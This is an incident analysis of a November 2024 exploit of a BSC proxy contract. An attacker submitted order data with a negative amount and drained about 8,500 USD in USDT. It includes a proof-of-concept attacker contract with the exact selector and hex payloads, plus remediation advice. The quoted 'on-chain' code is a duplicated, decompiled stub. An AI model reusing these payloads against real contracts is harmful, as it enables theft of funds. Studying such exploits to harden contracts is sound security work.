# Proxy b7e1 — Order Data Manipulation Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2024-11-20 |
| **Protocol** | ERC1967Proxy b7e1 (Unidentified DEX Protocol) |
| **Chain** | BSC |
| **Loss** | ~8,500 USD |
| **Attacker** | [0x9f2ecec0](https://bscscan.com/address/0x9f2ecec0145242c094b17807f299ce552a625ac5) |
| **Attack Tx** | [0x864d33d0](https://bscscan.com/tx/0x864d33d006e5c39c9ee8b35be5ae05a2013e556be3e078e2881b0cc6281bb265) |
| **Vulnerable Contract** | [0xb7e1d137](https://bscscan.com/address/0xb7e1d1372f2880373d7c5a931cdbaa73c38663c6) |
| **Root Cause** | Order processing function (selector 0x9b3e9b92) processes arbitrary order data including negative or overflow amounts without validation |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-11/proxy_b7e1_exp.sol) |

---
## 1. Vulnerability Overview

The 0xb7e1d137 ERC1967Proxy contract processed USDT-related orders through an order execution function (selector 0x9b3e9b92). The attacker drained USDT held by the contract by passing manipulated `fixedData` fields containing negative amounts or overflow values. The root cause is the absence of input validation on order data.

## 2. Vulnerable Code Analysis

```solidity
// ❌ proxy_b7e1: Missing input validation on order data
contract DEXProxy {
    // selector 0x9b3e9b92 — order execution function
    function executeOrder(
        address token,
        bytes32 fixedData,  // ❌ Allows manipulated negative/overflow values
        uint256 param3,
        uint256 param4,
        // ...
    ) external {
        // ❌ No range validation on the amount field within fixedData
        // ❌ Negative amount or int256 overflow enables large-scale theft
        int256 amount = int256(bytes32(fixedData));
        if (amount < 0) {
            // Negative amount → reverse transfer causes asset drainage
            IERC20(token).transfer(msg.sender, uint256(-amount));
        }
    }
}

// ✅ Fix:
// require(amount > 0 && amount <= maxOrderSize, "invalid amount");
// Safe conversion from int256 → uint256 with validation
```

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: proxy_decompiled.sol
contract proxy_Proxy {
contract proxy_Proxy {
    // EIP-1967 implementation slot
    bytes32 internal constant _IMPLEMENTATION_SLOT =
        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    fallback() external payable {  // ❌ Vulnerability
        // Delegates call to implementation contract via delegatecall
    }
}
```

## 3. Attack Flow

```
Attacker (0x9f2ecec0)
  │
  ├─[1]─▶ Check USDT balance of ERC1967Proxy
  │         proxyUsdtBal = USDT.balanceOf(ERC1967Proxy)
  │
  ├─[2]─▶ First order: fixedData1 (positive value)
  │         Submit initial order via selector 0x9b3e9b92
  │         Retrieve nextOrderId
  │
  ├─[3]─▶ Second order: fixedData2 (negative/overflow value)
  │         0xffffffffff...f8cd94b80000 (negative representation)
  │         └─ ❌ Large-scale USDT theft without validation
  │
  └─[4]─▶ ~8,500 USD USDT drained
```

## 4. PoC Code

```solidity
contract AttackerC {
    function attack() external {
        uint256 proxyUsdtBal = IERC20(BEP20USDT).balanceOf(ERC1967Proxy);

        // ❌ First manipulated order (initialization)
        bytes32 fixedData1 = hex"000001baffffe897231d193affff3120000000e19c552ef6e3cf430838298000";
        bytes memory data = abi.encodePacked(
            bytes4(0x9b3e9b92),
            abi.encode(address(BEP20USDT), fixedData1, 0, 1, 192, 224, 0, 0)
        );
        (bool c1, ) = ERC1967Proxy.call(data);

        uint256 nextOrderId = IERC1967Proxy(ERC1967Proxy).nextOrderId();

        // ❌ Second order: drain USDT via negative amount
        bytes32 fixedData2 = hex"fffffffffffffffffffffffffffffffffffffffffffffffffffff8cd94b80000";
        bytes memory data2 = abi.encodePacked(
            bytes4(0x9b3e9b92),
            abi.encode(address(BEP20USDT), fixedData2, /* ... */)
        );
        (bool c2, ) = ERC1967Proxy.call(data2);
        // → USDT drained via negative amount processing
    }
}
```

## 5. Vulnerability Classification

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Missing Input Validation / Integer Underflow |
| **Attack Vector** | Inducing reverse transfer via negative order amount |
| **CWE** | CWE-20: Improper Input Validation |
| **DASP** | Business Logic Vulnerability |
| **Severity** | High |

## 6. Remediation Recommendations

1. **Positive Amount Validation**: Require `> 0` check on all order amounts
2. **Safe int/uint Conversion**: Validate for overflow/underflow when converting from bytes32 to int256
3. **Maximum Order Amount**: Enforce a maximum amount cap per single order
4. **Order Data Validation**: Validate the byte range of each field within fixedData

## 7. Lessons Learned

- Order data encoded as bytes32 can be interpreted as a negative value when cast to int256, enabling reverse transfer attacks that exploit this behavior.
- Amount fields in DEX order systems must always be validated to fall within a positive range.
- Implementation functions in proxy pattern contracts must enforce equivalent levels of input validation.